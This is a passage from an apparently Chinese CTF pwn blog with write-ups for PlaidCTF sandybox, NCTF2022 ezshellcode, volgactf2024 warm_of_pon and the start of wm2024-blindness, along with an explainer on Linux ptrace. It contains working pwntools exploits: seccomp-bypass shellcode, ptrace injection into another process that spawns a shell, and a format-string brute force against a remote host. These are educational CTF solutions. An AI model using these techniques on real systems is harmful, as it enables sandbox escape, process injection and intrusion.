class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./sandybox&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 1000</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor eax, eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"><span class="comment"># Invoke int3 to invert the main tracer loop</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">mov rax, 8</span></span><br><span class="line"><span class="string">int3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># And now just read the flag file :)</span></span><br><span class="line">shellcode += asm(shellcraft.amd64.cat(<span class="string">&#x27;flag&#x27;</span>), arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://ctftime.org/writeup/20115">CTFtime.org / PlaidCTF 2020 / sandybox / Writeup</a></p><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p><a href="https://www.anquanke.com/post/id/231078">Linux沙箱入门——ptrace从0到1-安全客 - 安全资讯平台 (anquanke.com)</a></p><p>在Linux系统中，进程状态除了我们所熟知的<code>TASK_RUNNING</code>，<code>TASK_INTERRUPTIBLE</code>，<code>TASK_STOPPED</code>等，还有一个<code>TASK_TRACED</code>，而<code>TASK_TRACED</code>将调试程序断点成为可能。</p><ol><li><strong>R (TASK_RUNNING)，可执行状态。</strong></li><li><strong>S (TASK_INTERRUPTIBLE)，可中断的睡眠状态。</strong></li><li><strong>D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态。</strong></li><li><strong>T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态。</strong></li></ol><p>当使用了ptrace跟踪后，<strong>所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程</strong>，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED，而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span>       </span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid, <span class="type">void</span> *addr, <span class="type">void</span> *data)</span></span>;</span><br></pre></td></tr></table></figure><p>一共有四个参数：</p><ul><li><code>request</code>: 表示要执行的操作类型。反调试会用到<code>PT_DENY_ATTACH</code>，调试会用到<code>PTRACE_ATTACH</code></li><li><code>pid</code>: 要操作的目标进程ID</li><li><code>addr</code>: 要监控的目标内存地址</li><li><code>data</code>: 保存读取出或者要写入的数据</li></ul><p>request常见的可能取值有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    PTRACE_TRACEME = <span class="number">0</span>,        <span class="comment">//被调试进程调用</span></span><br><span class="line">    PTRACE_PEEKTEXT = <span class="number">1</span>， <span class="comment">//从内存addr处读取一个字节</span></span><br><span class="line">    PTRACE_PEEKDATA = <span class="number">2</span>,    <span class="comment">//查看内存addr处的一个字节</span></span><br><span class="line">    PTRACE_PEEKUSER = <span class="number">3</span>,    <span class="comment">//查看struct user 结构体的值</span></span><br><span class="line">    PTRACE_POKETEXT = <span class="number">4</span>， <span class="comment">//查看内存addr处一个字大小的内存（4字节）</span></span><br><span class="line">    PTRACE_POKEDATA = <span class="number">5</span>,    <span class="comment">//修改内存addr处一个字大小的内存（4字节）</span></span><br><span class="line">    PTRACE_POKEUSER = <span class="number">6</span>,    <span class="comment">//修改struct user结构体的值</span></span><br><span class="line">    PTRACE_CONT = <span class="number">7</span>,        <span class="comment">//被调试进程pid继续</span></span><br><span class="line">    PTRACE_SINGLESTEP = <span class="number">9</span>,    <span class="comment">//被调试进程pid执行一条汇编指令</span></span><br><span class="line">    PTRACE_GETREGS = <span class="number">12</span>,    <span class="comment">//获取寄存器(struct user_regs_struct)到内存data中</span></span><br><span class="line">    PTRACE_SETREGS = <span class="number">13</span>,    <span class="comment">//设置内存data上的数据为寄存器(struct user_regs_struct)</span></span><br><span class="line">    PTRACE_ATTACH = <span class="number">16</span>,        <span class="comment">//附加进程pid</span></span><br><span class="line">    PTRACE_DETACH = <span class="number">17</span>,        <span class="comment">//解除附加进程pid</span></span><br><span class="line">    PTRACE_SYSCALL = <span class="number">24</span>,    <span class="comment">//让被调试进程pid在下一次系统调用入口或出口停止</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">ptrace</span> <span class="params">(<span class="keyword">enum</span> __ptrace_request __request, ...)</span></span><br></pre></td></tr></table></figure><p><code>PTRACE_TRACEME</code>标志tracee表明自己想要被追踪，这会<u>自动与父进程建立</u>追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。</p><p>寄存器相关结构定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r15;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r14;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r13;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r12;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>bp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>bx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r11;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r10;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r9;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>r8;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ax;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>cx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>dx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>si;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>di;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>orig_ax;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ip;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>cs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>sp;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ss;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>fs_base;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>gs_base;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>ds;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>es;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>fs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>gs;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有配套的偏移值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">##/arch/x86/include/uapi/<span class="keyword">asm</span>/ptrace-abi.h</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R15 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R14 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R13 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R12 24</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RBP 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RBX 40</span></span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R11 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R10 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R9 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R8 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAX 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RCX 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RDX 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RSI 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RDI 112</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ORIG_RAX 120</span></span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RIP 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CS 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EFLAGS 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RSP 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SS 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __ASSEMBLY__ */</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FRAME_SIZE 168</span></span><br></pre></td></tr></table></figure><p>更多相关request可以看man手册或者内核源码</p><p>此外现在ptrace多了一些安全机制,即/proc/sys/kernel/yama/ptrace_scope</p><p>当该值被设置为1时，只能允许非特权用户ptrace跟踪自己的子进程</p><p>即使是属于自己的进程，如果不是子进程，仍然没有权限去attach，借此来实现一定程度上的避免ptrace进程注入</p><h1 id="NCTF2022-ezshellcode"><a href="#NCTF2022-ezshellcode" class="headerlink" title="NCTF2022-ezshellcode"></a>NCTF2022-ezshellcode</h1><p>题目很短</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v3 = getpid();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pid: %d\n&quot;</span>, v3);</span><br><span class="line">  buf = mmap((<span class="type">void</span> *)<span class="number">0x401000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v5 = seccomp_init(<span class="number">2147418112LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">41LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">49LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">42LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v5, <span class="number">0LL</span>, <span class="number">50LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v5);</span><br><span class="line">  close(<span class="number">0</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))buf)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行任意代码执行,但是关闭了0,1,2三个标准流</p><p>在ezthree这题中我们是通过socket通信来实现获取flag</p><p>但这题很贴心的去除了socket相关系统调用</p><p>不过却给了我们进程的pid,并且可以发现在Dockerfile中有这么一句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</span><br></pre></td></tr></table></figure><p>关闭了ptrace特权保护</p><p>那么接下来的思路就很明确了,我们打开两个ezshellcode进程</p><p>其中A进程在得到其pid后阻塞在那,暂时不管</p><p>B进程则利用A的pid去ptrace注入A进程,并在读取完shellcode后,利用ptrace使得A进程直接跳转到shellcode处执行,跳过关闭0,1,2</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: p.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: p.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span>: gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Pid: &#x27;</span>)</span><br><span class="line">pid=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;pid-&gt;&#x27;</span>+<span class="built_in">hex</span>(pid))</span><br><span class="line"> </span><br><span class="line">shellcode=shellcraft.ptrace(<span class="number">0x10</span>,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">0x18</span>,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.wait4(pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">12</span>,pid,<span class="number">0</span>,<span class="number">0x401500</span>)</span><br><span class="line">shellcode+=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   mov r9,0x401000</span></span><br><span class="line"><span class="string">   mov r8,0x401500</span></span><br><span class="line"><span class="string">   mov r11,qword ptr [r8+0x78]</span></span><br><span class="line"><span class="string">   mov r12,0</span></span><br><span class="line"><span class="string">   cmp r11,r12</span></span><br><span class="line"><span class="string">   je return</span></span><br><span class="line"><span class="string">   mov qword ptr [r8+0x80],r9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span><span class="comment">#如果是read调用则允许,并去到下一次syscall循环</span></span><br><span class="line">shellcode+=shellcraft.ptrace(<span class="number">13</span>,pid,<span class="number">0x401500</span>)+shellcraft.ptrace(<span class="number">17</span>,pid,<span class="number">0</span>,<span class="number">0</span>)+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">return:</span></span><br><span class="line"><span class="string">    mov r13,0x401013</span></span><br><span class="line"><span class="string">    jmp r13</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sl(asm(shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"> </span><br><span class="line">r.sendline(asm(shellcraft.sh()))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="volgactf2024-warm-of-pon"><a href="#volgactf2024-warm-of-pon" class="headerlink" title="volgactf2024-warm_of_pon"></a>volgactf2024-warm_of_pon</h1><p>题目东西不多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+30h] [rbp+0h]</span></span><br><span class="line">  <span class="type">void</span> *retaddr; <span class="comment">// [rsp+38h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  setup(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  *(&amp;savedregs - <span class="number">305</span>) = (<span class="type">unsigned</span> __int64)<span class="built_in">malloc</span>(<span class="number">8uLL</span>) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL;</span><br><span class="line">  *(_QWORD *)*(&amp;savedregs - <span class="number">305</span>) = retaddr;</span><br><span class="line">  gets(format);</span><br><span class="line">  <span class="built_in">printf</span>(format);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">0x20</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)((i &lt;&lt; <span class="number">12</span>) + *(&amp;savedregs - <span class="number">305</span>)) )</span><br><span class="line">      retaddr = *(<span class="type">void</span> **)((i &lt;&lt; <span class="number">12</span>) + *(&amp;savedregs - <span class="number">305</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始将retaddr保存到堆中,然后有一个栈溢出一个格式化字符串漏洞</p><p>直接修改栈上的返回地址是没有用的,因为格式化字符串漏洞之后会从堆上恢复之前保存的地址</p><p>一开始的思路是劫持.fini.array</p><p>但发现其没有写权限,后来一度没有思路</p><p>直到发现最后那个循环很奇怪,最后越看越觉得是爆破</p><p>那个循环就是为了加大爆破成功的概率,因为他会检查整个堆,并且以后找到的为返回地址,这极大提高了成功的概率(大概提了二十倍)</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sh = remote(<span class="string">&#x27;172.105.246.203&#x27;</span>, <span class="number">1339</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;%4555c%11$ln%117c%12$hhn&#x27;</span> + p64(<span class="number">0x568000</span>) + p64(<span class="number">0x568000</span> + <span class="number">2</span>)</span><br><span class="line">    <span class="comment">#0x568000是随便选的,只要在堆范围内就行</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">    output = sh.recvall()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;CTF&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    sh.close()</span><br></pre></td></tr></table></figure><h1 id="wm2024-blindness"><a href="#wm2024-blindness" class="headerlink" title="wm2024-blindness"></a>wm2024-blindness</h1><p>允许我们申请一个任意大小的chunk</p><p>之后再解释256字节的brainfuck</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> sizea; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">void</span> *size_4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input the data size\n&quot;</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  sizea = readInt();</span><br><span class="line">  data = (__int64)<span class="built_in">malloc</span>(sizea);</span><br><span class="line">  <span class="keyword">if</span> ( !data )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input the code size\n&quot;</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  size = readInt();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  size_4 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !size_4 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;error\n&quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(<span class="string">&quot;Pls input your code\n&quot;</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Pls input your code\n&quot;</span>, v4);</span><br><span class="line">  read(<span class="number">0</span>, size_4, size);</span><br><span class="line">  executeBrainfuck(size_4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其允许我们在申请出的堆块附近任意读写,但是只能向上读写</p><p>这要如何利用?</p><p>我们知道在malloc申请时,如果现有堆无法满足分配大小,会有两种情况,一种是抬高brk拓展现有堆,还有一种是直接使用mmap分配</p><p>当申请大小较大时会是第二种情况</p><p>且可以观察到,这种情况下,这个申请出来的堆块是于libc区域相邻的,也就是出题人给的hint</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 